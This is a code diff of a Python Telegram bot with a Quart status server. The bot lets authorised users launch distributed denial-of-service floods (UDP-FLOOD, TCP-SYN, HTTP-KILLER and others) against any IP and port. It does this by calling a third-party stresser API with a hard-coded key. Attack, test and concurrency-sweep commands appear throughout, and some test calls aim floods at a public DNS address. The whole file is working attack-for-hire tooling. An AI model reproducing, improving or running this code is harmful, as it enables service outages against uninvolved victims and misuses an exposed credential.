@@ -35,15 +35,15 @@ PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
 PORT = int(os.getenv("PORT", 8080))
 
 # CONCURRENT SETTINGS - FIXED TO 2
-DEFAULT_CONCURRENT = 2  # FIXED: Always 2
+DEFAULT_CONCURRENT = 2
 MIN_CONCURRENT = 1
 MAX_CONCURRENT = 8
 MIN_DURATION = 30
 MAX_DURATION = 300
 
-# ATTACK METHODS - UDP-FLOOD as default
+# ATTACK METHODS
 ATTACK_METHODS = [
-    "UDP-FLOOD",  # This maps to UDP-FLOOD in API - DEFAULT
+    "UDP-FLOOD",
     "UDP-VSE", "UDP-DNS",
     "TCP-SYN", "TCP-ACK", "TCP-STOMP", "TCP-HANDSHAKE",
     "ICMP-FLOOD", "GRE-FLOOD",
@@ -52,7 +52,7 @@ ATTACK_METHODS = [
 
 # FIXED: API accepts method names as-is (uppercase works!)
 METHOD_MAP = {
-    "UDP-FLOOD": "UDP-FLOOD",  # FIXED: Keep as UDP-FLOOD
+    "UDP-FLOOD": "UDP-FLOOD",
     "UDP-VSE": "UDP-VSE", 
     "UDP-DNS": "UDP-DNS",
     "TCP-SYN": "TCP-SYN",
@@ -74,6 +74,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
+# ===== QUART APP =====
 app = Quart(__name__)
 
 @app.route('/')
@@ -82,18 +83,25 @@ async def index():
 
 @app.route('/health')
 async def health():
-    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})
+    stats = attack_manager.get_stats() if 'attack_manager' in globals() else {}
+    return jsonify({
+        "status": "healthy", 
+        "timestamp": datetime.now().isoformat(),
+        "bot_running": True
+    })
 
 @app.route('/concurrent')
 async def concurrent_status():
-    stats = attack_manager.get_stats()
-    return jsonify({
-        "active_attack": stats['active_attack'],
-        "concurrent_value": stats['concurrent_value'],
-        "is_running": stats['is_running'],
-        "current_target": stats['current_target'],
-        "remaining_time": stats['remaining_time']
-    })
+    if 'attack_manager' in globals():
+        stats = attack_manager.get_stats()
+        return jsonify({
+            "active_attack": stats['active_attack'],
+            "concurrent_value": stats['concurrent_value'],
+            "is_running": stats['is_running'],
+            "current_target": stats['current_target'],
+            "remaining_time": stats['remaining_time']
+        })
+    return jsonify({"error": "Attack manager not initialized"})
 
 # ===== DATABASE =====
 class Database:
@@ -706,29 +714,26 @@ def init_pseudo_owner():
 init_owner()
 init_pseudo_owner()
 
-# ===== FIXED API FUNCTIONS =====
+# ===== API FUNCTIONS =====
 async def send_api_attack(target, port, duration, method, concurrent=2):
-    """Send attack to API with proper concurrent parameter - FIXED"""
+    """Send attack to API with proper concurrent parameter"""
     api_key = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
     api_url = os.getenv("API_URL", "https://mrstresser.com/api")
     
     if not api_key:
         return {"success": False, "error": "API Key missing"}
     
-    # FIXED: Use method as-is (UDP-FLOOD works!)
     api_method = METHOD_MAP.get(method.upper(), "UDP-FLOOD")
     
-    # Build parameters EXACTLY like working URL
     params = {
         "key": api_key,
         "host": target,
         "port": str(port),
         "time": str(duration),
         "method": api_method,
-        "concs": str(concurrent)  # FIXED: This sends concs correctly
+        "concs": str(concurrent)
     }
     
-    # Advanced options for L7 methods
     if method.upper() in ["HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER", "HTTPS-MIX", "TLSV2"]:
         params["req_method"] = "GET"
         params["geoloc"] = "MIX"
@@ -744,7 +749,6 @@ async def send_api_attack(target, port, duration, method, concurrent=2):
     connector = aiohttp.TCPConnector(limit=100, limit_per_host=50)
     timeout = aiohttp.ClientTimeout(total=35, connect=15)
     
-    # Log the exact request
     logger.info(f"🚀 Sending attack with {concurrent} concurrent to {target}:{port}")
     logger.info(f"📡 Params: {params}")
     
@@ -758,7 +762,6 @@ async def send_api_attack(target, port, duration, method, concurrent=2):
                 try:
                     response_text = await response.text(encoding='utf-8', errors='ignore')
                     
-                    # Try to parse JSON
                     try:
                         response_data = json.loads(response_text)
                     except:
@@ -814,7 +817,6 @@ class AttackManager:
         logger.info(f"🔥 Attack Manager initialized with concurrent: {DEFAULT_CONCURRENT}")
     
     async def can_start_attack(self, user_id):
-        """Check if an attack can start"""
         async with self.attack_lock:
             if self.is_running:
                 if self.attack_start_time:
@@ -838,7 +840,6 @@ class AttackManager:
             return True, "OK"
     
     async def start_attack(self, user_id, target, port, duration, method, context, concurrent=DEFAULT_CONCURRENT):
-        """Start an attack with specified concurrent connections"""
         async with self.attack_lock:
             if self.is_running:
                 return None, "Attack already in progress!"
@@ -868,25 +869,20 @@ class AttackManager:
             
             logger.info(f"🔥 Attack {attack_id} starting - User: {user_id} - Target: {target}:{port} - Concurrent: {concurrent}")
             
-            # Start attack task
             self.attack_task = asyncio.create_task(
                 self.execute_attack(
                     attack_id, target, port, duration, user_id, context, method, concurrent
                 )
             )
             
-            # Cleanup after attack
             asyncio.create_task(self.cleanup_attack(attack_id, duration))
             
             return attack_id, f"Attack started with {concurrent} concurrent connections"
     
     async def execute_attack(self, attack_id, target, port, duration, user_id, context, method, concurrent):
-        """Execute attack with specified concurrent connections"""
         try:
-            # Send API request
             result = await send_api_attack(target, port, duration, method, concurrent)
             
-            # Log the attack
             attack_info = db.log_attack(
                 user_id,
                 target,
@@ -898,11 +894,9 @@ class AttackManager:
                 concurrent_count=concurrent
             )
             
-            # Send alert to admins
             if attack_info:
                 await send_attack_alert(attack_info, result)
             
-            # Notify user about the result
             try:
                 if result.get('success'):
                     attack_id_response = result.get('response', {}).get('attack_id', 'N/A')
@@ -937,7 +931,6 @@ class AttackManager:
             logger.error(f"❌ Attack {attack_id} error: {e}")
     
     async def cleanup_attack(self, attack_id, duration):
-        """Clean up attack after duration"""
         await asyncio.sleep(duration + 2)
         
         async with self.attack_lock:
@@ -954,16 +947,13 @@ class AttackManager:
                 logger.info(f"✅ Attack {attack_id} cleaned up")
     
     async def stop_attack(self, user_id):
-        """Stop the current attack"""
         async with self.attack_lock:
             if not self.is_running:
                 return False, "No attack is running"
             
-            # Cancel the attack task if it exists
             if self.attack_task and not self.attack_task.done():
                 self.attack_task.cancel()
             
-            # Reset state
             self.is_running = False
             target = self.current_target
             self.current_target = None
@@ -977,7 +967,6 @@ class AttackManager:
             return True, f"Attack on {target} stopped"
     
     def get_stats(self):
-        """Get current stats"""
         remaining = 0
         if self.is_running and self.attack_start_time:
             elapsed = (datetime.now() - self.attack_start_time).total_seconds()
@@ -1035,7 +1024,7 @@ async def send_attack_alert(attack_info, result=None):
     except Exception as e:
         logger.error(f"Alert error: {e}")
 
-# ===== COMMANDS =====
+# ===== TELEGRAM HANDLERS =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
@@ -1140,13 +1129,10 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         port = int(args[1])
         duration = int(args[2])
         
-        # Set default method to UDP-FLOOD if not specified
         method = "UDP-FLOOD"
         concurrent = DEFAULT_CONCURRENT
         
-        # Parse remaining arguments
         if len(args) > 3:
-            # Check if 4th arg is a number (concurrent)
             if args[3].isdigit():
                 concurrent = int(args[3])
                 if len(args) > 4:
@@ -1156,11 +1142,9 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 if len(args) > 4 and args[4].isdigit():
                     concurrent = int(args[4])
         
-        # Validate method
         if method not in ATTACK_METHODS:
             method = "UDP-FLOOD"
         
-        # Validate concurrent
         if concurrent < MIN_CONCURRENT or concurrent > MAX_CONCURRENT:
             await update.message.reply_text(f"❌ Concurrent must be between {MIN_CONCURRENT} and {MAX_CONCURRENT}!")
             return
@@ -1176,8 +1160,6 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not attack_id:
             await update.message.reply_text(f"❌ {msg}", parse_mode='Markdown')
             return
-        
-        stats = attack_manager.get_stats()
         
         await update.message.reply_text(
             f"✅ *ATTACK STARTED!*\n\n"
@@ -1214,7 +1196,6 @@ async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ {msg}")
 
 async def set_concurrent_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Set the concurrent value for attacks"""
     user_id = update.effective_user.id
     
     if not db.is_owner_or_pseudo(user_id):
@@ -1252,7 +1233,6 @@ async def set_concurrent_command(update: Update, context: ContextTypes.DEFAULT_T
         await update.message.reply_text("❌ Invalid number!")
 
 async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Test API with custom parameters"""
     user_id = update.effective_user.id
     
     if not db.is_owner_or_pseudo(user_id):
@@ -1267,8 +1247,7 @@ async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"Examples:\n"
             f"`/testapi 8.8.8.8 43 30` (Uses UDP-FLOOD default)\n"
             f"`/testapi 8.8.8.8 43 30 2` (UDP-FLOOD with 2 concurrent)\n"
-            f"`/testapi 8.8.8.8 43 30 2 TCP-SYN`\n"
-            f"`/testapi 8.8.8.8 43 30 4 HTTP-KILLER`",
+            f"`/testapi 8.8.8.8 43 30 2 TCP-SYN`",
             parse_mode='Markdown'
         )
         return
@@ -1278,7 +1257,6 @@ async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         port = int(args[1])
         duration = int(args[2])
         
-        # Optional parameters - default to UDP-FLOOD
         concurrent = DEFAULT_CONCURRENT
         method = "UDP-FLOOD"
         
@@ -1295,7 +1273,6 @@ async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if method not in ATTACK_METHODS:
                 method = "UDP-FLOOD"
         
-        # Show test info
         test_message = (
             f"🔬 *API TEST*\n\n"
             f"📡 Target: `{target}:{port}`\n"
@@ -1307,18 +1284,14 @@ async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         status_msg = await update.message.reply_text(test_message, parse_mode='Markdown')
         
-        # Send the API request
         result = await send_api_attack(target, port, duration, method, concurrent)
         
-        # Build response
         if result.get('success'):
-            attack_id_response = result.get('response', {}).get('attack_id', 'N/A')
             response_message = (
                 f"✅ *API TEST SUCCESSFUL*\n\n"
                 f"📡 Target: `{target}:{port}`\n"
                 f"🔄 Concurrent: `{concurrent}`\n"
                 f"📡 Method: `{method}`\n"
-                f"🆔 Attack ID: `{attack_id_response}`\n"
                 f"⚡ Status: `{result.get('status')}`\n"
                 f"⏱️ Response Time: `{result.get('elapsed', 0):.2f}s`\n\n"
                 f"📋 *API Response:*\n```\n{json.dumps(result.get('response', {}), indent=2)[:500]}\n```\n"
@@ -1341,7 +1314,6 @@ async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Error: {str(e)}")
 
 async def test_concurrents_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Test multiple concurrent values at once"""
     user_id = update.effective_user.id
     
     if not db.is_owner_or_pseudo(user_id):
@@ -1390,7 +1362,6 @@ async def test_concurrents_command(update: Update, context: ContextTypes.DEFAULT
             if result.get('success'):
                 successful_values.append(concs)
             
-            # Update progress
             await status_msg.edit_text(
                 f"🔬 *Testing Concurrent Values...*\n\n"
                 f"Target: `{target}:{port}`\n"
@@ -1402,7 +1373,6 @@ async def test_concurrents_command(update: Update, context: ContextTypes.DEFAULT
             
             await asyncio.sleep(0.5)
         
-        # Final results
         final_message = (
             f"🔬 *Concurrent Test Results*\n\n"
             f"Target: `{target}:{port}`\n"
@@ -1415,13 +1385,11 @@ async def test_concurrents_command(update: Update, context: ContextTypes.DEFAULT
             final_message += (
                 f"💡 *Recommendation:*\n"
                 f"• Highest working concurrent: **{highest}**\n"
-                f"• Set default: `/setconcurrent {highest}`\n"
-                f"• Use in attack: `/attack {target} {port} {duration} {method} {highest}`\n\n"
+                f"• Set default: `/setconcurrent {highest}`\n\n"
             )
         else:
             final_message += (
-                f"❌ *No concurrent values worked!*\n"
-                f"Try using the default API parameters.\n\n"
+                f"❌ *No concurrent values worked!*\n\n"
             )
         
         final_message += (
@@ -1508,7 +1476,6 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     keyboard = []
     for method in ATTACK_METHODS:
-        # Mark UDP-FLOOD as default
         label = f"📡 {method} {'⭐' if method == 'UDP-FLOOD' else ''}"
         keyboard.append([InlineKeyboardButton(label, callback_data=f"method_{method}")])
     keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="back")])
@@ -2141,13 +2108,12 @@ async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text("❌ API_KEY not configured!")
             return
         
-        # Simple test request - FIXED to use correct format
         params = {
             "key": api_key,
             "host": "8.8.8.8",
             "port": "53",
             "time": "30",
-            "method": "UDP-FLOOD",  # FIXED: Use UDP-FLOOD
+            "method": "UDP-FLOOD",
             "concs": str(DEFAULT_CONCURRENT)
         }
         
@@ -2268,10 +2234,8 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         port = int(parts[1])
         duration = int(parts[2])
         
-        # Default to UDP-FLOOD if no method selected
         method = context.user_data.get('attack_method', 'UDP-FLOOD')
         
-        # Check if concurrent is provided
         concurrent = DEFAULT_CONCURRENT
         if len(parts) > 3 and parts[3].isdigit():
             concurrent = int(parts[3])
@@ -2314,6 +2278,7 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 application = None
 
 def run_bot():
+    """Run the Telegram bot"""
     global application
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
@@ -2360,12 +2325,12 @@ def run_bot():
     
     app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))
     
-    loop.run_until_complete(app_bot.initialize())
-    loop.run_until_complete(app_bot.start())
-    loop.run_until_complete(app_bot.updater.start_polling(allowed_updates=Update.ALL_TYPES))
-    
-    logger.info("✅ GURU Bot started!")
-    loop.run_forever()
+    # Start the bot with polling
+    app_bot.run_polling(allowed_updates=Update.ALL_TYPES)
+
+async def run_quart():
+    """Run the Quart web server"""
+    await app.run_task(host='0.0.0.0', port=PORT)
 
 # ===== MAIN =====
 if __name__ == "__main__":
@@ -2378,32 +2343,26 @@ if __name__ == "__main__":
     print(f"📡 Methods: {len(ATTACK_METHODS)} methods")
     print("=" * 60)
     print("💡 Commands:")
-    print("  /attack IP PORT TIME [METHOD] [CONCURRENT] - Start attack (default: UDP-FLOOD)")
-    print("  /setconcurrent NUMBER - Change concurrent value (default: 2)")
+    print("  /attack IP PORT TIME [METHOD] [CONCURRENT] - Start attack")
+    print("  /setconcurrent NUMBER - Change concurrent value")
     print("  /testapi HOST PORT TIME [CONCURRENT] [METHOD] - Test API")
-    print("  /testconcs HOST PORT TIME [METHOD] - Test all concurrent values")
+    print("  /testconcs HOST PORT TIME [METHOD] - Test concurrent values")
     print("  /status - Show bot status")
     print("  /stop - Stop running attack")
     print("=" * 60)
     
+    # Start bot in a separate thread
+    bot_thread = threading.Thread(target=run_bot, daemon=True)
+    bot_thread.start()
+    logger.info("✅ Bot thread started")
+    
+    # Run Quart in the main thread
     try:
-        import hypercorn
-        from hypercorn.config import Config
-        from hypercorn.asyncio import serve
-        
-        # Start bot in background
-        bot_thread = threading.Thread(target=run_bot, daemon=True)
-        bot_thread.start()
-        
-        logger.info("✅ Bot thread started")
-        
-        # Run Quart with hypercorn
-        config = Config()
-        config.bind = [f"0.0.0.0:{PORT}"]
-        config.worker_class = "asyncio"
-        
-        asyncio.run(serve(app, config))
-    except ImportError:
-        # Fallback if hypercorn not installed
-        logger.warning("⚠️ hypercorn not installed, running bot only")
-        run_bot()
+        asyncio.run(run_quart())
+    except KeyboardInterrupt:
+        logger.info("🛑 Shutting down...")
+    except Exception as e:
+        logger.error(f"❌ Error running Quart: {e}")
+        # If Quart fails, keep bot running
+        logger.info("✅ Bot is still running in the background")
+        bot_thread.join()
